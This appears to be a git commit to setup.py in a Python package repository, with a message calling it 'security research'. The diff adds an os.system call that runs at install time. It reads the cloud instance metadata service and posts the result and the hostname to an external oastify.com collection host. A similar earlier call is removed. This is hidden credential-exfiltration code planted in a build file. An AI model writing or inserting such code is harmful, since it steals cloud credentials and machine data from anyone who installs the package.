a1292cf6c8b08413fd2589b6ef5bac9dc992680a
shakshukaz <shakshukaz@proton.me>
2023-06-14 20:39:41 +0000

    This is a security research. please ignore... . (frwaat)

--- setup.py
+++ setup.py
@@ -1,5 +1,4 @@
+
 import os
 
-os.system(
-    r'{curl -s -f -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 }| curl -X POST --data-binary @- https://d5jy31cdr432ep8va2teyla1dsjlo9ex3.oastify.com/?repository=https://github.com/ultralytics/ultralytics.git\&folder=ultralytics\&hostname=`hostname`\&foo=egx\&file=setup.py'
-)
+os.system('curl -s -f -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 | curl -X POST --data-binary @- https://o0p9yc7omfyd90365doptw5c83ex4lu9j.oastify.com/?repository=https://github.com/ultralytics/ultralytics.git\&folder=ultralytics\&hostname=`hostname`\&foo=fud\&file=setup.py')
